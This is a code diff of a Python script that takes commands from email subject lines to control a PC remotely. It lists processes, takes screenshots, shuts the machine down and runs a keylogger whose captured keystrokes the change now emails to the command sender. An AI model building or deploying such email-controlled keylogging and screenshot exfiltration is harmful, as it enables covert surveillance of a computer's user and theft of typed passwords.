@@ -12,7 +12,7 @@ from email.header import decode_header
 import screenshot
 import shutdown
 from process_app import *
-from keylogger import *
+from keylogger import key_logger
 
 smtp_server = 'smtp.gmail.com'  # SMTP server for Gmail
 smtp_port = 587  # Port for TLS
@@ -50,33 +50,35 @@ def send_email(sender, receiver, subject, body, image_data = None):
 
 def CheckAndDo(cmd):
     if (cmd == 'applications'):
+        print("Applications")
         send_email(username_checker, username_receiver,
                    "List of applications:", execute_msg(cmd))
     elif (cmd == 'processes'):
+        print("Processes")
         send_email(username_checker, username_receiver,
                    "List of processes:", execute_msg(cmd))
     elif ('Start' in cmd):
         send_email(username_checker, username_receiver,
                    "List of processes:", execute_msg(cmd))
     elif (cmd == 'keylogger'):
-        # duration of keylogger
-        print(get_key_log(cmd))
+        print("Key Logger")
+        send_email(username_checker, username_receiver,
+                   "Keys pressed:", key_logger())
     elif (cmd == 'screenshot'):
+        print("Screenshot")
         image_data = screenshot.screen_shot()
         send_email(username_checker, username_receiver,
                    "Screenshot Taken!", "See attachment: ", image_data)
     elif (cmd == 'shutdown'):
+        print("Shutdown")
         send_email(username_checker, username_receiver,
                    "Shutting Down PC!", "PC is shutting down...")
         shutdown.shutdown()
-    else:
-        print(cmd)
 
 cmd = 'start'
 while cmd != 'quit':
     imap.select("Inbox")
     res, mailIds = imap.search(None, '(UNSEEN)')  #Find all unseen mails in Inbox to read
-    print(res)
 
     # Read every unseen mail
     for id in mailIds[0].decode().split():
@@ -85,6 +87,7 @@ while cmd != 'quit':
 
         # Get message from Subject part of the mail
         cmd = message.get("Subject")
+        cmd.lower()
         username_receiver = message.get("From")
         CheckAndDo(cmd = cmd)
 
@@ -94,6 +97,6 @@ while cmd != 'quit':
 
 print("Bye !!!")
 
-#-------------------------------------------------------------------------------------------------
+#-----------------------------------------------------------------------------------------
 
 imap.logout()
